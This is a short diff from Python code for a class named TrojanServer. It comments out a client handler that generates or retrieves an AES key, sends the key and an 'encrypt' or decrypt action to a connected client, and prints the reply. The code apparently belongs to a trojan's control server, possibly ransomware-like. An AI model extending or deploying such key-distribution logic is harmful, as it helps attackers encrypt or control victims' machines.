@@ -107,18 +107,18 @@ class TrojanServer:
         self.keys = AesKeyManager()
 
     def handle_client(self):
-        if self.action == "encrypt":
-            aes_key = self.generate_and_store_aes_key()
-        else:
-            aes_key = self.retrieve_aes_key()
+        # if self.action == "encrypt":
+        #     aes_key = self.generate_and_store_aes_key()
+        # else:
+        #     aes_key = self.retrieve_aes_key()
 
-        protocol.send(self.conn, aes_key)
-        protocol.send(self.conn, self.action)
+        # protocol.send(self.conn, aes_key)
+        # protocol.send(self.conn, self.action)
 
-        data = protocol.receive(self.conn)
-        decoded_data = data.decode()
+        # data = protocol.receive(self.conn)
+        # decoded_data = data.decode()
 
-        print(decoded_data)
+        # print(decoded_data)
 
     def generate_and_store_aes_key(self):
         word = self.keys.get_random_word()
